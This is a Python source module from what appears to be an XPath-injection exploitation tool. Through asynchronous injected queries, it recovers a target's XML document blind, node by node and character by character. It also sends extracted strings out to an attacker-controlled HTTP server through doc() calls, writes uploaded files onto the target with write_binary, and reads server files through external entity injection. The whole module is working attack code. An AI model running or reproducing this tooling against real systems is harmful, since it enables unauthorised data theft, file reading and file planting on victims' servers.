import asyncio
import base64
import string as stdlib_string

from xpath import ROOT_NODE
from xpath.functions import (concat, count, doc, encode_for_uri,
                             normalize_space, string, string_length,
                             string_to_codepoints, substring, substring_before)
from xpath.functions.fs import base_64_binary, write_binary

from .display import XMLNode
from .requester import Requester

ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
MISSING_CHARACTER = "?"


async def count(requester: Requester, expression, func=count):
    if requester.features['oob-http']:
        result = await get_string_via_oob(requester, string(func(expression)))
        if result is not None and result.isdigit():
            return int(result)

    return await binary_search(requester, func(expression), min=0)


async def get_char(requester: Requester, expression):
    if requester.features['codepoint-search']:
        return await codepoint_search(requester, expression)
    elif requester.features['substring-search']:
        return await substring_search(requester, expression)
    else:
        # Dumb search
        top_characters = "".join(c[0] for c in requester.counters['common-characters'].most_common())
        search_space = top_characters + "".join(c for c in ASCII_SEARCH_SPACE if c not in top_characters)

        for space in search_space:
            if await requester.check(expression == space):
                requester.counters['common-characters'][space] += 1
                return space


async def get_common_string(requester, expression, length):
    if length >= 10:
        return

    common_names = [item[0] for item in requester.counters['common-strings'].most_common()
                    if len(item[0]) == length][:5]
    if common_names:
        futures = [requester.check(expression == common_name) for common_name in common_names]
        results = zip(await asyncio.gather(*futures), common_names)

        for result, name in results:
            if result:
                requester.counters['common-string-results']['hit'] += 1
                requester.counters['common-strings'][name] += 1
                return name

        requester.counters['common-string-results']['miss'] += 1


async def get_string(requester: Requester, expression, disable_normalization=False):
    if requester.features['normalize-space'] and not disable_normalization:
        expression = normalize_space(expression)

    if requester.features['oob-http']:
        result = await get_string_via_oob(requester, expression)
        if result is not None:
            return result
        else:
            pass

    total_string_length = await count(requester, expression, func=string_length)

    if total_string_length == 0:
        return ""

    # Try common strings we've got before
    result = await get_common_string(requester, expression, total_string_length)
    if result is not None:
        return result

    fetch_length = total_string_length if not requester.fast else min(15, total_string_length)

    chars_futures = [
        get_char(requester, substring(expression, i, 1))
        for i in range(1, fetch_length + 1)
    ]

    chars = await asyncio.gather(*chars_futures)

    result = "".join(
        char if char is not None else MISSING_CHARACTER
        for char in chars
    )

    if requester.fast and fetch_length != total_string_length:
        difference = total_string_length - fetch_length
        return '{result}... ({difference} more characters)'.format(result=result,
                                                                   difference=difference)
    else:
        if len(result) <= 10:
            requester.counters['common-strings'][result] += 1

    return result


async def upload_file_via_oob(requester: Requester, remote_path, file_bytes: bytes):
    encoded = base64.encodebytes(file_bytes)
    server = await requester.get_oob_server()
    url, future = server.expect_file_download(encoded.decode())

    await requester.check(write_binary(remote_path, base_64_binary(doc(url) / 'data')))

    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return False


async def get_string_via_oob(requester: Requester, expression):
    server = await requester.get_oob_server()
    url, future = server.expect_data()

    if not await requester.check(
                            doc(concat('{url}?d='.format(url=url),
                                       encode_for_uri(expression))) / 'data' == server.test_response_value):
        return None

    try:
        return await asyncio.wait_for(future, timeout=5)
    except asyncio.TimeoutError:
        return None


async def get_file_via_entity_injection(requester: Requester, file_path):
    server = await requester.get_oob_server()
    url, future = server.expect_entity_injection('SYSTEM "{file_path}"'.format(file_path=file_path))

    return await get_string_via_oob(requester, doc(url) / 'data')


def iterate_all(requester: Requester, expressions):
    for text in expressions:
        yield get_string(requester, text)


async def get_all_text(requester: Requester, expression):
    text_node_count = await count(requester, expression.text)
    text_contents = await asyncio.gather(
        *iterate_all(requester, expression.text(text_node_count))
    )

    return "".join(text_contents)


async def get_node_comments(requester: Requester, expression):
    comments_count = await count(requester, expression.comments)

    futures = [get_string(requester, comment) for comment in expression.comments(comments_count)]

    return await asyncio.gather(*futures)


async def binary_search(requester: Requester, expression, min, max=25):
    if await requester.check(expression > max):
        return await binary_search(requester, expression, min, max * 2)

    while True:
        if max < min:
            return -1

        midpoint = (min + max) // 2

        if await requester.check(expression < midpoint):
            max = midpoint - 1
        elif await requester.check(expression > midpoint):
            min = midpoint + 1
        else:
            return midpoint


async def substring_search(requester: Requester, expression):
    # Small issue:
    # string-length(substring-before('abc','z')) == 0
    # string-length(substring-before('abc','a')) == 0
    # So we need to explicitly check if the expression is equal to the first char in our search space.
    # Not optimal, but still works out fairly efficient.

    if await requester.check(expression == ASCII_SEARCH_SPACE[0]):
        return ASCII_SEARCH_SPACE[0]

    result = await binary_search(
        requester,
        string_length(substring_before(ASCII_SEARCH_SPACE, expression)),
        min=0,
        max=len(ASCII_SEARCH_SPACE))
    if result == 0:
        return None
    else:
        return ASCII_SEARCH_SPACE[result]


async def codepoint_search(requester: Requester, expression):
    result = await binary_search(
        requester,
        expression=string_to_codepoints(expression),
        min=0,
        max=255)
    if result == 0:
        return None
    else:
        return chr(result)


async def get_nodes(requester: Requester, starting_path=ROOT_NODE):
    attributes, child_node_count, text_content, comments, node_name = await asyncio.gather(
        get_node_attributes(requester, starting_path),
        count(requester, starting_path.children),
        get_all_text(requester, starting_path),
        get_node_comments(requester, starting_path),
        get_string(requester, starting_path.name)
    )

    return (XMLNode(name=node_name, attributes=attributes, text=text_content, comments=comments),
            [get_nodes(requester, starting_path=child) for child in starting_path.children(child_node_count)])


async def get_node_attributes(requester: Requester, node):
    attribute_count = await count(requester, node.attributes)

    async def _get_attributes_task(attr):
        return await asyncio.gather(get_string(requester, attr.name), get_string(requester, attr))

    results = await asyncio.gather(*[_get_attributes_task(attr) for attr in node.attributes(attribute_count)])

    return dict(results)
